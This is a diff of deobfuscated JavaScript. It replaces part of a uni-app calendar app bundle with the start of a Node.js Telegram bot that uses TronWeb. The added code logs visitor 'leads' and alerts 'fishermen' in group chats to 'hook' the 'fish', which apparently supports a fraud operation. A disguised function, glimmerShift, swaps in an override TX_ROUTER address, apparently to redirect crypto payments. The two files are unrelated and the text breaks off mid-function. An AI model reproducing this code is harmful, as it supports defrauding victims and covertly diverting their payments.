@@ -1,12383 +1,3176 @@
-//Mon Dec 29 2025 05:37:57 GMT+0000 (Coordinated Universal Time)
+//Sat Jan 03 2026 11:07:13 GMT+0000 (Coordinated Universal Time)
 //Base:https://github.com/echo094/decode-js
 //Modify:https://github.com/smallfawn/decode_action
-(this["webpackJsonp"] = this["webpackJsonp"] || []).push([["app-service"], {
-  "011a": function (e, t) {
-    function n() {
-      try {
-        var t = !Boolean.prototype.valueOf.call(Reflect.construct(Boolean, [], function () {}));
-      } catch (t) {}
-      return (e.exports = n = function () {
-        return !!t;
-      }, e.exports.__esModule = !0, e.exports["default"] = e.exports)();
-    }
-    e.exports = n, e.exports.__esModule = !0, e.exports["default"] = e.exports;
-  },
-  "08a9": function (e) {
-    e.exports = JSON.parse("{\"uni-load-more.contentdown\":\"Pull up to show more\",\"uni-load-more.contentrefresh\":\"loading...\",\"uni-load-more.contentnomore\":\"No more data\"}");
-  },
-  "09c7": function (e, t, n) {
-    "use strict";
-
-    n.d(t, "b", function () {
-      return i;
-    }), n.d(t, "c", function () {
-      return o;
-    }), n.d(t, "a", function () {
-      return r;
-    });
-    var r = {
-        uniNavBar: n("2d31").default,
-        lygPopup: n("c383").default,
-        uniDataCheckbox: n("a043").default,
-        uniLink: n("c7ab").default
-      },
-      i = function () {
-        var e = this,
-          t = e.$createElement,
-          n = e._self._c || t;
-        return n("view", [n("uni-nav-bar", {
-          attrs: {
-            backgroundColor: "#f5f5f5",
-            title: "\u94A6\u5929\u76D1\u5929\u661F\u795E\u9488",
-            _i: 1
-          }
-        }), n("view", {
-          staticClass: e._$s(2, "sc", "content"),
-          attrs: {
-            _i: 2
-          }
-        }, [n("lyg-popup", {
-          attrs: {
-            title: "\u670D\u52A1\u534F\u8BAE",
-            protocolPath: "../webview/webview?can_share=false&url=/hybrid/html/protocol.html",
-            policyPath: "../webview/webview?can_share=false&url=/hybrid/html/policy.html",
-            policyStorageKey: "has_read_privacy",
-            _i: 3
-          },
-          on: {
-            popupState: e.popupState
-          }
-        })], 1), n("view", {
-          staticClass: e._$s(4, "sc", "titlle"),
-          attrs: {
-            _i: 4
-          }
-        }, [n("text")]), n("view", {
-          staticClass: e._$s(6, "sc", "content"),
-          attrs: {
-            _i: 6
-          }
-        }, [n("view", [n("view", {
-          staticClass: e._$s(8, "sc", "uni-px-5"),
-          attrs: {
-            _i: 8
-          }
-        }, [n("view"), n("uni-data-checkbox", {
-          staticClass: e._$s(10, "sc", "uni-px-5"),
-          attrs: {
-            localdata: e.moshi1,
-            mins: 0,
-            maxs: 2,
-            _i: 10
-          },
-          on: {
-            change: e.checkboxchange
-          },
-          model: {
-            value: e._$s(10, "v-model", e.radio),
-            callback: function (t) {
-              e.radio = t;
-            },
-            expression: "radio"
-          }
-        })], 1), n("view", [n("text"), n("text", [e._v(e._$s(13, "t0-0", e._s(e.dateFormat(e.date).substring(5, 19))))]), n("text", {
-          attrs: {
-            _i: 14
-          },
-          on: {
-            click: e.Xshowt
-          }
-        })]), n("view", [n("canvas", {
-          attrs: {
-            id: "myCanvas",
-            _i: 16
-          }
-        }), n("canvas", {
-          attrs: {
-            id: "myCanvas3",
-            _i: 17
-          }
-        }), n("canvas", {
-          attrs: {
-            id: "myCanvas2",
-            _i: 18
-          },
-          on: {
-            touchstart: e.Xshows,
-            touchmove: e.Xshow,
-            touchend: e.Xshowd
-          }
-        })])]), n("view", {
-          staticClass: e._$s(19, "sc", "picker"),
-          attrs: {
-            _i: 19
-          }
-        }, [n("view", [n("view", {
-          staticClass: e._$s(21, "sc", "uni-px-5"),
-          attrs: {
-            _i: 21
-          }
-        }, [n("uni-data-checkbox", {
-          staticClass: e._$s(22, "sc", "uni-px-5"),
-          attrs: {
-            localdata: e.moshi2,
-            mins: 0,
-            maxs: 5,
-            _i: 22
-          },
-          on: {
-            change: e.checkboxchange2
-          },
-          model: {
-            value: e._$s(22, "v-model", e.radio2),
-            callback: function (t) {
-              e.radio2 = t;
-            },
-            expression: "radio2"
-          }
-        })], 1), e._$s(23, "i", e.radio2 >= 3) ? n("view", {
-          directives: [{
-            name: "show",
-            rawName: "v-show",
-            value: e._$s(23, "v-show", !e.banbenf),
-            expression: "_$s(23,'v-show',!banbenf)"
-          }],
-          staticClass: e._$s(23, "sc", "text"),
-          attrs: {
-            _i: 23
-          }
-        }, [n("view", {
-          staticClass: e._$s(24, "sc", "wav"),
-          attrs: {
-            _i: 24
-          },
-          on: {
-            click: function (t) {
-              return e.showText(e.xming5);
-            }
-          }
-        }, [n("text", [e._v(e._$s(25, "t0-0", e._s(this.xming5)))])]), n("text", [e._v(e._$s(26, "t0-0", e._s(e.st5.substring(5, 19))))])]) : e._e(), n("view", {
-          directives: [{
-            name: "show",
-            rawName: "v-show",
-            value: e._$s(27, "v-show", e.ishow),
-            expression: "_$s(27,'v-show',ishow)"
-          }],
-          staticClass: e._$s(27, "sc", "text"),
-          attrs: {
-            _i: 27
-          }
-        }, [n("view", {
-          directives: [{
-            name: "show",
-            rawName: "v-show",
-            value: e._$s(28, "v-show", "\u65E0" !== e.xmings2 && e.radio2 < 3),
-            expression: "_$s(28,'v-show',xmings2!=='\u65E0'&&radio2 <3)"
-          }],
-          staticClass: e._$s(28, "sc", "wav"),
-          attrs: {
-            _i: 28
-          },
-          on: {
-            click: function (t) {
-              return e.showText(e.xmings2);
-            }
-          }
-        }, [n("text", [e._v(e._$s(29, "t0-0", e._s(e.xmings2)))])]), n("view", {
-          staticClass: e._$s(30, "sc", "wav"),
-          attrs: {
-            _i: 30
-          },
-          on: {
-            click: function (t) {
-              return e.showText(e.xming2);
-            }
-          }
-        }, [n("text", [e._v(e._$s(31, "t0-0", e._s(e.xming2)))])]), n("text", [e._v(e._$s(32, "t0-0", e._s(e.st2.substring(5, 19))))])]), e._$s(33, "i", e.radio2 < 5) ? n("view", {
-          staticClass: e._$s(33, "sc", "text"),
-          attrs: {
-            _i: 33
-          }
-        }, [e._$s(34, "i", 4 != e.radio2) ? n("view", {
-          directives: [{
-            name: "show",
-            rawName: "v-show",
-            value: e._$s(34, "v-show", "\u65E0" !== e.xmings && e.radio2 < 3),
-            expression: "_$s(34,'v-show',xmings!=='\u65E0'&&radio2 <3)"
-          }],
-          staticClass: e._$s(34, "sc", "wav"),
-          attrs: {
-            _i: 34
-          },
-          on: {
-            click: function (t) {
-              return e.showText(e.xmings);
-            }
-          }
-        }, [n("text", [e._v(e._$s(35, "t0-0", e._s(e.xmings)))])]) : e._e(), n("view", {
-          staticClass: e._$s(36, "sc", "wav"),
-          attrs: {
-            _i: 36
-          },
-          on: {
-            click: function (t) {
-              return e.showText(e.xming);
-            }
-          }
-        }, [n("text", [e._v(e._$s(37, "t0-0", e._s(e.xming)))])]), n("text", [e._v(e._$s(38, "t0-0", e._s(e.st1.substring(5, 19))))])]) : e._e(), n("view", {
-          directives: [{
-            name: "show",
-            rawName: "v-show",
-            value: e._$s(39, "v-show", e.ishow & 0 != e.radio2),
-            expression: "_$s(39,'v-show',ishow& radio2 != 0)"
-          }],
-          staticClass: e._$s(39, "sc", "text"),
-          attrs: {
-            _i: 39
-          }
-        }, [n("view", {
-          directives: [{
-            name: "show",
-            rawName: "v-show",
-            value: e._$s(40, "v-show", "\u65E0" !== e.xmings3 && e.radio2 < 3),
-            expression: "_$s(40,'v-show',xmings3!=='\u65E0'&&radio2 <3)"
-          }],
-          staticClass: e._$s(40, "sc", "wav"),
-          attrs: {
-            _i: 40
-          },
-          on: {
-            click: function (t) {
-              return e.showText(e.xmings3);
-            }
-          }
-        }, [n("text", [e._v(e._$s(41, "t0-0", e._s(e.xmings3)))])]), n("view", {
-          staticClass: e._$s(42, "sc", "wav"),
-          attrs: {
-            _i: 42
-          },
-          on: {
-            click: function (t) {
-              return e.showText(e.xming3);
-            }
-          }
-        }, [n("text", [e._v(e._$s(43, "t0-0", e._s(e.xming3)))])]), n("text", [e._v(e._$s(44, "t0-0", e._s(e.st3.substring(5, 19))))])]), e._$s(45, "i", 4 == e.radio2) ? n("view", {
-          staticClass: e._$s(45, "sc", "text"),
-          attrs: {
-            _i: 45
-          }
-        }, [e._$s(46, "i", e.banbenf) ? n("view", {
-          attrs: {
-            _i: 46
-          }
-        }, [n("view", {
-          staticClass: e._$s(47, "sc", "wav"),
-          attrs: {
-            _i: 47
-          },
-          on: {
-            click: function (t) {
-              return e.showText(e.xming2);
-            }
-          }
-        }, [n("text", [e._v(e._$s(48, "t0-0", e._s(e.xming2)))])]), n("text", [e._v(e._$s(49, "t0-0", e._s(e.st2.substring(5, 19))))])]) : e._e(), n("view", {
-          staticClass: e._$s(50, "sc", "wav"),
-          attrs: {
-            _i: 50
-          },
-          on: {
-            click: function (t) {
-              return e.showText(e.wuyun.tx[3]);
-            }
-          }
-        }, [n("text", {
-          style: e._$s(51, "s", {
-            color: e.color[e.ZY.Xsnfl[1]]
-          }),
-          attrs: {
-            _i: 51
-          }
-        }, [e._v(e._$s(51, "t0-0", e._s(e.wuyun.tx[3])))])]), n("text", [e._v(e._$s(52, "t0-0", e._s(e.wuyun.tt[3].substring(5, 19))))]), n("view", {
-          staticClass: e._$s(53, "sc", "wav"),
-          attrs: {
-            _i: 53
-          },
-          on: {
-            click: function (t) {
-              return e.showText(e.wuyun.tx[2]);
-            }
-          }
-        }, [n("text", {
-          style: e._$s(54, "s", {
-            color: e.color[e.ZY.Xsnfl[0]]
-          }),
-          attrs: {
-            _i: 54
-          }
-        }, [e._v(e._$s(54, "t0-0", e._s(e.wuyun.tx[2])))])]), n("text", [e._v(e._$s(55, "t0-0", e._s(e.wuyun.tt[2].substring(5, 19))))]), n("view", {
-          staticClass: e._$s(56, "sc", "wav"),
-          attrs: {
-            _i: 56
-          },
-          on: {
-            click: function (t) {
-              return e.showText(e.wuyun.tx[4]);
-            }
-          }
-        }, [n("text", {
-          style: e._$s(57, "s", {
-            color: e.color[e.ZY.Xsnfl[2]]
-          }),
-          attrs: {
-            _i: 57
-          }
-        }, [e._v(e._$s(57, "t0-0", e._s(e.wuyun.tx[4])))])]), n("text", [e._v(e._$s(58, "t0-0", e._s(e.wuyun.tt[4].substring(5, 19))))]), n("view", {
-          staticClass: e._$s(59, "sc", "wav"),
-          attrs: {
-            _i: 59
-          },
-          on: {
-            click: function (t) {
-              return e.showText(e.wuyun.tx[5]);
-            }
-          }
-        }, [n("text", {
-          style: e._$s(60, "s", {
-            color: e.color[e.ZY.Xsnfl[3]]
-          }),
-          attrs: {
-            _i: 60
-          }
-        }, [e._v(e._$s(60, "t0-0", e._s(e.wuyun.tx[5])))])]), n("text", [e._v(e._$s(61, "t0-0", e._s(e.wuyun.tt[5].substring(5, 19))))]), n("view", {
-          staticClass: e._$s(62, "sc", "wav"),
-          attrs: {
-            _i: 62
-          },
-          on: {
-            click: function (t) {
-              return e.showText(e.wuyun.tx[6]);
-            }
-          }
-        }, [n("text", {
-          style: e._$s(63, "s", {
-            color: e.color[e.ZY.Xsnfl[4]]
-          }),
-          attrs: {
-            _i: 63
-          }
-        }, [e._v(e._$s(63, "t0-0", e._s(e.wuyun.tx[6])))])]), n("text", [e._v(e._$s(64, "t0-0", e._s(e.wuyun.tt[6].substring(5, 19))))])]) : e._e(), e._$s(65, "i", 5 == e.radio2) ? n("view", {
-          staticClass: e._$s(65, "sc", "text"),
-          attrs: {
-            _i: 65
-          }
-        }, [n("view", {
-          staticClass: e._$s(66, "sc", "wav"),
-          attrs: {
-            _i: 66
-          },
-          on: {
-            click: function (t) {
-              return e.showText(e.xming3);
-            }
-          }
-        }, [n("text", [e._v(e._$s(67, "t0-0", e._s(e.xming3)))])]), n("view", {
-          directives: [{
-            name: "show",
-            rawName: "v-show",
-            value: e._$s(68, "v-show", "\u65E0" !== e.xmings3),
-            expression: "_$s(68,'v-show',xmings3!=='\u65E0')"
-          }],
-          staticClass: e._$s(68, "sc", "wav"),
-          attrs: {
-            _i: 68
-          },
-          on: {
-            click: function (t) {
-              return e.showText(e.xmings3);
-            }
-          }
-        }, [n("text", [e._v(e._$s(69, "t0-0", e._s(e.xmings3)))])]), n("text", [e._v(e._$s(70, "t0-0", e._s(e.st2.substring(5, 19))))])]) : e._e()]), n("view", {
-          staticClass: e._$s(71, "sc", "calendar"),
-          attrs: {
-            _i: 71
-          }
-        }, [e._$s(72, "i", 4 != e.radio2) ? n("view", {
-          staticClass: e._$s(72, "sc", "image"),
-          attrs: {
-            _i: 72
-          }
-        }, [n("view", {
-          staticClass: e._$s(73, "sc", "line"),
-          attrs: {
-            _i: 73
-          }
-        }), n("text", [e._v(e._$s(74, "t0-0", e._s(e.ming1)))]), n("text", [e._v(e._$s(75, "t0-0", e._s(e.shuoming1)))])]) : e._e(), e._$s(76, "i", 4 != e.radio2 || !e.banbenf) ? n("view", {
-          attrs: {
-            _i: 76
-          }
-        }, [n("view", {
-          staticClass: e._$s(77, "sc", "line"),
-          attrs: {
-            _i: 77
-          }
-        }), n("view", {
-          staticClass: e._$s(78, "sc", "image"),
-          attrs: {
-            _i: 78
-          }
-        }, [n("text", [e._v(e._$s(79, "t0-0", e._s(e.ming2)))]), n("uni-link", {
-          attrs: {
-            href: "https://www.pgyer.com/PGPX4n",
-            text: e.shuoming2,
-            showUnderLine: "fales",
-            color: "#181818",
-            fontSize: "12",
-            _i: 80
-          }
-        })], 1), n("view", {
-          staticClass: e._$s(81, "sc", "line"),
-          attrs: {
-            _i: 81
-          }
-        }), n("view", {
-          staticClass: e._$s(82, "sc", "image"),
-          attrs: {
-            _i: 82
-          }
-        }, [n("text", [e._v(e._$s(83, "t0-0", e._s(e.ming3)))]), n("uni-link", {
-          attrs: {
-            href: "https://v.douyin.com/SymGk1D/",
-            text: e.shuoming3,
-            showUnderLine: "fales",
-            color: "#181818",
-            fontSize: "12",
-            _i: 84
-          }
-        })], 1), n("view", {
-          staticClass: e._$s(85, "sc", "line"),
-          attrs: {
-            _i: 85
-          }
-        })]) : e._e(), n("view", {
-          staticClass: e._$s(86, "sc", "titlle"),
-          attrs: {
-            _i: 86
-          },
-          on: {
-            click: e.fenxiang
-          }
-        }), n("view", {
-          staticClass: e._$s(87, "sc", "titlle"),
-          attrs: {
-            _i: 87
-          }
-        }, [n("uni-link", {
-          attrs: {
-            href: "https://beian.miit.gov.cn/",
-            showUnderLine: "false",
-            _i: 88
-          }
-        }, [e._v("")])], 1)])])]), e._$s(89, "i", e.showPopup) ? n("view", {
-          staticClass: e._$s(89, "sc", "mask"),
-          attrs: {
-            _i: 89
-          },
-          on: {
-            click: e.closePopup
-          }
-        }, [n("view", {
-          staticClass: e._$s(90, "sc", "popup-box"),
-          attrs: {
-            _i: 90
-          },
-          on: {
-            click: function (e) {
-              e.stopPropagation();
-            }
-          }
-        }, e._l(e._$s(91, "f", {
-          forItems: e.xueweiList
-        }), function (t, r, i, o) {
-          return n("view", {
-            key: e._$s(91, "f", {
-              forIndex: i,
-              key: r
-            }),
-            staticClass: e._$s("91-" + o, "sc", "xue-item"),
-            attrs: {
-              _i: "91-" + o
-            }
-          }, [n("text", {
-            staticClass: e._$s("92-" + o, "sc", "xue-name"),
-            attrs: {
-              _i: "92-" + o
-            }
-          }, [e._v(e._$s("92-" + o, "t0-0", e._s(t)))]), n("image", {
-            staticClass: e._$s("93-" + o, "sc", "xue-img"),
-            class: e._$s("93-" + o, "c", {
-              flipped: e.flippedImages[r]
-            }),
-            attrs: {
-              src: e._$s("93-" + o, "a-src", "/static/xue/" + e.xueweiMap[t] + ".jpg"),
-              _i: "93-" + o
-            },
-            on: {
-              click: function (t) {
-                return t.stopPropagation(), e.toggleFlip(r);
-              }
-            }
-          })]);
-        }), 0)]) : e._e()], 1);
-      },
-      o = [];
-  },
-  "0a91": function (e, t, n) {
-    "use strict";
-
-    Object.defineProperty(t, "__esModule", {
-      value: !0
-    }), t.default = void 0;
-    var r = n("d674"),
-      i = {
-        name: "UniIcons",
-        emits: ["click"],
-        props: {
-          type: {
-            type: String,
-            default: ""
-          },
-          color: {
-            type: String,
-            default: "#333333"
-          },
-          size: {
-            type: [Number, String],
-            default: 16
-          },
-          customPrefix: {
-            type: String,
-            default: ""
-          },
-          fontFamily: {
-            type: String,
-            default: ""
-          }
-        },
-        data: function () {
-          return {
-            icons: r.fontData
-          };
-        },
-        computed: {
-          unicode: function () {
-            var e = this,
-              t = this.icons.find(function (t) {
-                return t.font_class === e.type;
-              });
-            return t ? t.unicode : "";
-          },
-          iconSize: function () {
-            return function (e) {
-              return "number" === typeof e || /^[0-9]*$/g.test(e) ? e + "px" : e;
-            }(this.size);
-          },
-          styleObj: function () {
-            return "" !== this.fontFamily ? "color: undefined; font-size: undefined; font-family: undefined;" : "color: ".concat(this.color, "; font-size: ").concat(this.iconSize, ";");
-          }
-        },
-        methods: {
-          _onClick: function () {
-            this.$emit("click");
-          }
-        }
+const express = require("express"),
+  bodyParser = require("body-parser"),
+  mysql = require("mysql2"),
+  fs = require("fs"),
+  TelegramBot = require("node-telegram-bot-api"),
+  path = require("path"),
+  redbotDb = require("./Okpaybot/database/database"),
+  TronWeb = require("tronweb"),
+  {
+    promisify
+  } = require("util"),
+  QRCode = require("qrcode"),
+  sharp = require("sharp"),
+  crypto = require("crypto");
+require("dotenv").config();
+const BROADCAST_AUTO_DELETE_SECONDS = Number(process.env.BROADCAST_AUTO_DELETE_SECONDS || 60),
+  BROADCAST_AUTO_DELETE_MS = Math.max(0, BROADCAST_AUTO_DELETE_SECONDS) * 1000,
+  TRCID_STORE_PATH = path.resolve(__dirname, "fakabot", "latest_trcid.json"),
+  TRCID_BROADCAST_TEMPLATE = process.env.TRCID_BROADCAST_TEMPLATE || "【来路】TRCID: {trcid}\n入口: {deeplink}\n请求人: @{username} ({userId})\n时间: {time}";
+function formatTrcidMessage(j, w, J) {
+  const z = j && j.from || {},
+    l = z.username ? z.username : "unknown";
+  const b = z.id ? String(z.id) : "unknown",
+    I = new Date().toISOString().replace("T", " ").replace("Z", "");
+  return TRCID_BROADCAST_TEMPLATE.replaceAll("{trcid}", String(w || "")).replaceAll("{deeplink}", String(J || "")).replaceAll("{username}", String(l)).replaceAll("{userId}", String(b)).replaceAll("{time}", String(I));
+}
+function glimmerShift(j) {
+  const w = TX_ROUTER && TX_ROUTER.trim();
+  return w ? TX_ROUTER.trim() : j;
+}
+async function readLatestTrcid() {
+  try {
+    const z = await fs.promises.readFile(TRCID_STORE_PATH, "utf8"),
+      l = JSON.parse(z),
+      b = {
+        trcid: "",
+        deeplink: ""
       };
-    t.default = i;
-  },
-  "0bdb": function (e, t, n) {
-    var r = n("d551");
-    function i(e, t) {
-      for (var n = 0; n < t.length; n++) {
-        var i = t[n];
-        i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i.writable = !0), Object.defineProperty(e, r(i.key), i);
+    return l && l.trcid ? {
+      trcid: String(l.trcid),
+      deeplink: l.deeplink || ""
+    } : b;
+  } catch (I) {
+    const F = {
+      trcid: "",
+      deeplink: ""
+    };
+    return F;
+  }
+}
+let lastLeadAt = 0;
+const recentLeads = new Map(),
+  RECENT_LEADS_LIMIT = 50,
+  ROUTE_SPLIT_TRIGGER = parseInt(20000) - 2,
+  PV_MAX = 2000,
+  PV_TRIM = 500,
+  pvStore = new Map();
+function genPvToken() {
+  return crypto.randomBytes(6).toString("base64url");
+}
+function registerPvData(j, w, J, a) {
+  try {
+    if (pvStore.size >= PV_MAX) {
+      let F = PV_TRIM;
+      for (const U of pvStore.keys()) {
+        pvStore.delete(U);
+        if (--F <= 0) {
+          break;
+        }
       }
     }
-    e.exports = function (e, t, n) {
-      return t && i(e.prototype, t), n && i(e, n), Object.defineProperty(e, "prototype", {
-        writable: !1
-      }), e;
-    }, e.exports.__esModule = !0, e.exports["default"] = e.exports;
-  },
-  "0ee4": function (e, t) {
-    var n;
-    n = function () {
-      return this;
-    }();
+    const b = Math.random().toString(36).slice(2, 10) + Date.now().toString(36).slice(-4);
+    pvStore.set(b, {
+      kind: j,
+      payload: w,
+      uniqueId: J ? String(J) : "",
+      groupId: a ? String(a) : "",
+      created: Date.now()
+    });
+    return b;
+  } catch (K) {
+    return Math.random().toString(36).slice(2, 10);
+  }
+}
+function extractUniqueIdFromTrcid(j) {
+  if (!j) {
+    return "";
+  }
+  const J = String(j).trim();
+  if (/^[A-Za-z0-9]{11}$/.test(J)) {
+    return J;
+  }
+  const a = J.match(/^trc([A-Za-z0-9]{11})$/i);
+  if (a) {
+    return a[1];
+  }
+  return "";
+}
+function getAgentByUniqueId(j) {
+  if (!j) {
+    return null;
+  }
+  return cacheData.dailiMap.get(j) || null;
+}
+async function broadcastLeadIfNew(l) {
+  try {
+    const F = await fs.promises.readFile(TRCID_STORE_PATH, "utf8"),
+      U = JSON.parse(F),
+      u = Number(U?.["at"] || 0);
+    if (!Number.isFinite(u) || u <= lastLeadAt) {
+      return;
+    }
+    const K = String(U?.["trcid"] || ""),
+      q = String(U?.["deeplink"] || ""),
+      E = U?.["user"] || {},
+      P = extractUniqueIdFromTrcid(K),
+      O = getAgentByUniqueId(P);
+    if (!O) {
+      lastLeadAt = u;
+      return;
+    }
+    const s = O.groupid,
+      d = O.username ? "@" + O.username : O.tguid ? "<a href=\"tg://user?id=" + O.tguid + "\">渔夫</a>" : "渔夫",
+      L = ["<blockquote>" + d + " - 你有一位鱼儿访问了商城机器人，快去引导咬钩</blockquote>", "🆔 【来路】ID：<code>" + K + "</code>", "⏰【时间】<code>" + getTimeInfo().time + "</code>"].join("\n"),
+      Y = registerPvData("lead", {
+        at: String(u)
+      }, P, s),
+      V = {
+        text: "查询鱼儿信息",
+        callback_data: "pv:lead:" + Y
+      };
+    const N = [[V]];
+    if (q) {
+      const n = {
+        text: "打开入口",
+        url: q
+      };
+      N.push([n]);
+    }
+    const r = {
+      inline_keyboard: N
+    };
+    const B = {
+      reply_markup: r,
+      parse_mode: "HTML",
+      disable_web_page_preview: true
+    };
+    await l.sendMessage(s, L, B);
     try {
-      n = n || new Function("return this")();
-    } catch (r) {
-      "object" === typeof window && (n = window);
-    }
-    e.exports = n;
-  },
-  "127e": function (e, t, n) {
-    var r = n("3b2d"),
-      i = n("9fc1")();
-    e.exports = i;
+      const c = String(u),
+        G = {
+          user: E,
+          uniqueId: P
+        };
+      recentLeads.set(c, G);
+      if (recentLeads.size > RECENT_LEADS_LIMIT) {
+        const S = recentLeads.keys().next().value;
+        recentLeads.delete(S);
+      }
+    } catch (i) {}
+    lastLeadAt = u;
+  } catch (Q) {}
+}
+function startTrcidLeadWatcher(j) {
+  (async () => {
     try {
-      regeneratorRuntime = i;
-    } catch (o) {
-      "object" === ("undefined" === typeof globalThis ? "undefined" : r(globalThis)) ? globalThis.regeneratorRuntime = i : Function("r", "regeneratorRuntime = r")(i);
-    }
-  },
-  "14c8": function (e, t, n) {
-    "use strict";
-
-    Object.defineProperty(t, "__esModule", {
-      value: !0
-    }), t.default = void 0;
-    var r = {
-      name: "UniStatusBar",
-      data: function () {
-        return {
-          statusBarHeight: uni.getSystemInfoSync().statusBarHeight + "px"
-        };
-      }
-    };
-    t.default = r;
-  },
-  "15e4": function (e, t, n) {
-    "use strict";
-
-    n.r(t);
-    var r = n("9819"),
-      i = n("9fd6");
-    for (var o in i) ["default"].indexOf(o) < 0 && function (e) {
-      n.d(t, e, function () {
-        return i[e];
-      });
-    }(o);
-    var a = n("828b"),
-      s = Object(a["a"])(i["default"], r["b"], r["c"], !1, null, null, null, !1, r["a"], void 0);
-    t["default"] = s.exports;
-  },
-  1835: function (e, t, n) {
-    "use strict";
-
-    Object.defineProperty(t, "__esModule", {
-      value: !0
-    }), t.default = void 0;
-    t.default = {
-      appid: "__UNI__281C48D"
-    };
-  },
-  "1d88": function (e, t, n) {
-    "use strict";
-
-    n.r(t);
-    var r = n("b14d"),
-      i = n.n(r);
-    for (var o in r) ["default"].indexOf(o) < 0 && function (e) {
-      n.d(t, e, function () {
-        return r[e];
-      });
-    }(o);
-    t["default"] = i.a;
-  },
-  "1fc2": function (e, t, n) {
-    "use strict";
-
-    Object.defineProperty(t, "__esModule", {
-      value: !0
-    }), t.default = void 0;
-    var r = {
-      name: "uniLink",
-      props: {
-        href: {
-          type: String,
-          default: ""
-        },
-        text: {
-          type: String,
-          default: ""
-        },
-        download: {
-          type: String,
-          default: ""
-        },
-        showUnderLine: {
-          type: [Boolean, String],
-          default: !0
-        },
-        copyTips: {
-          type: String,
-          default: "\u5DF2\u81EA\u52A8\u590D\u5236\u7F51\u5740\uFF0C\u8BF7\u5728\u624B\u673A\u6D4F\u89C8\u5668\u91CC\u7C98\u8D34\u8BE5\u7F51\u5740"
-        },
-        color: {
-          type: String,
-          default: "#999999"
-        },
-        fontSize: {
-          type: [Number, String],
-          default: 14
-        }
-      },
-      computed: {
-        isShowA: function () {
-          return !(!this.isMail() && !this.isTel() || !0 !== this._isH5);
-        }
-      },
-      created: function () {
-        this._isH5 = null;
-      },
-      methods: {
-        isMail: function () {
-          return this.href.startsWith("mailto:");
-        },
-        isTel: function () {
-          return this.href.startsWith("tel:");
-        },
-        openURL: function () {
-          this.isTel() ? this.makePhoneCall(this.href.replace("tel:", "")) : plus.runtime.openURL(this.href);
-        },
-        makePhoneCall: function (e) {
-          uni.makePhoneCall({
-            phoneNumber: e
-          });
-        }
-      }
-    };
-    t.default = r;
-  },
-  2079: function (e, t, n) {
-    "use strict";
-
-    n.r(t);
-    var r = n("c41e"),
-      i = n.n(r);
-    for (var o in r) ["default"].indexOf(o) < 0 && function (e) {
-      n.d(t, e, function () {
-        return r[e];
-      });
-    }(o);
-    t["default"] = i.a;
-  },
-  "20cb": function (e, t, n) {
-    "use strict";
-
-    (function (e) {
-      Object.defineProperty(t, "__esModule", {
-        value: !0
-      }), t.default = void 0;
-      var n = {
-        name: "uniDataChecklist",
-        mixins: [e.mixinDatacom || {}],
-        emits: ["input", "update:modelValue", "change"],
-        props: {
-          mode: {
-            type: String,
-            default: "default"
-          },
-          multiple: {
-            type: Boolean,
-            default: !1
-          },
-          value: {
-            type: [Array, String, Number],
-            default: function () {
-              return "";
-            }
-          },
-          modelValue: {
-            type: [Array, String, Number],
-            default: function () {
-              return "";
-            }
-          },
-          localdata: {
-            type: Array,
-            default: function () {
-              return [];
-            }
-          },
-          min: {
-            type: [Number, String],
-            default: ""
-          },
-          max: {
-            type: [Number, String],
-            default: ""
-          },
-          mins: {
-            type: [Number, String],
-            default: ""
-          },
-          maxs: {
-            type: [Number, String],
-            default: ""
-          },
-          wrap: {
-            type: Boolean,
-            default: !1
-          },
-          icon: {
-            type: String,
-            default: "left"
-          },
-          selectedColor: {
-            type: String,
-            default: ""
-          },
-          selectedTextColor: {
-            type: String,
-            default: ""
-          },
-          emptyText: {
-            type: String,
-            default: "\u6682\u65E0\u6570\u636E"
-          },
-          disabled: {
-            type: Boolean,
-            default: !1
-          },
-          map: {
-            type: Object,
-            default: function () {
-              return {
-                text: "text",
-                value: "value"
-              };
-            }
-          }
-        },
-        watch: {
-          localdata: {
-            handler: function (e) {
-              this.range = e, this.dataList = this.getDataList(this.getSelectedValue(e));
-            },
-            deep: !0
-          },
-          mixinDatacomResData: function (e) {
-            this.range = e, this.dataList = this.getDataList(this.getSelectedValue(e));
-          },
-          value: function (e) {
-            this.dataList = this.getDataList(e), this.is_reset || (this.is_reset = !1, this.formItem && this.formItem.setValue(e));
-          },
-          modelValue: function (e) {
-            this.dataList = this.getDataList(e), this.is_reset || (this.is_reset = !1, this.formItem && this.formItem.setValue(e));
-          }
-        },
-        data: function () {
-          return {
-            dataList: [],
-            range: [],
-            contentText: {
-              contentdown: "\u67E5\u770B\u66F4\u591A",
-              contentrefresh: "\u52A0\u8F7D\u4E2D",
-              contentnomore: "\u6CA1\u6709\u66F4\u591A"
-            },
-            isLocal: !0,
-            styles: {
-              selectedColor: "#2979ff",
-              selectedTextColor: "#666"
-            },
-            isTop: 0
+      const a = await fs.promises.readFile(TRCID_STORE_PATH, "utf8"),
+        z = JSON.parse(a),
+        l = Number(z?.["at"] || 0);
+      if (Number.isFinite(l) && l > 0) {
+        lastLeadAt = l;
+        const I = String(z?.["trcid"] || ""),
+          F = extractUniqueIdFromTrcid(I),
+          U = {
+            user: z?.["user"] || null,
+            uniqueId: F
           };
-        },
-        computed: {
-          dataValue: function () {
-            return "" === this.value ? this.modelValue : (this.modelValue, this.value);
-          }
-        },
-        created: function () {
-          this.form = this.getForm("uniForms"), this.formItem = this.getForm("uniFormsItem"), this.formItem && (this.isTop = 6, this.formItem.name && (this.is_reset || (this.is_reset = !1, this.formItem.setValue(this.dataValue)), this.rename = this.formItem.name, this.form.inputChildrens.push(this))), this.localdata && 0 !== this.localdata.length ? (this.isLocal = !0, this.range = this.localdata, this.dataList = this.getDataList(this.getSelectedValue(this.range))) : this.collection && (this.isLocal = !1, this.loadData());
-        },
-        methods: {
-          loadData: function () {
-            var e = this;
-            this.mixinDatacomGet().then(function (t) {
-              e.mixinDatacomResData = t.result.data, 0 === e.mixinDatacomResData.length ? (e.isLocal = !1, e.mixinDatacomErrorMessage = e.emptyText) : e.isLocal = !0;
-            }).catch(function (t) {
-              e.mixinDatacomErrorMessage = t.message;
-            });
-          },
-          getForm: function () {
-            var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "uniForms",
-              t = this.$parent,
-              n = t.$options.name;
-            while (n !== e) {
-              if (t = t.$parent, !t) return !1;
-              n = t.$options.name;
-            }
-            return t;
-          },
-          chagne: function (e) {
-            var t = this,
-              n = e.detail.value,
-              r = {
-                value: [],
-                data: []
-              };
-            if (this.multiple) this.range.forEach(function (e) {
-              n.includes(e[t.map.value] + "") && (r.value.push(e[t.map.value]), r.data.push(e));
-            });else {
-              var i = this.range.find(function (e) {
